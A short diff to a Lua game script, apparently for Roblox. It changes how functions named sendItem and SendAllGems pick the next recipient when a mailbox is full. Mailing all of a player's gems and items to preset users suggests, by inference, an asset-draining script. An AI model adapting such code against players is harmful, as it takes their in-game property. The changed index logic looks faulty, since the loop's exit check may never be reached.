@@ -210,7 +210,7 @@ local function sendItem(category, uid, am)
                 mailSendPrice = 5000000
             end
         elseif response == false and err == "They don't have enough space!" then
-            userIndex = 2
+            userIndex = 1
             if userIndex > maxUsers then
                 sent = true
             end
@@ -241,7 +241,7 @@ local function SendAllGems()
                     if response == true then
                         sent = true
                     elseif response == false and err == "They don't have enough space!" then
-                        userIndex = 2
+                        userIndex = 1
                         if userIndex > maxUsers then
                             sent = true
                         end
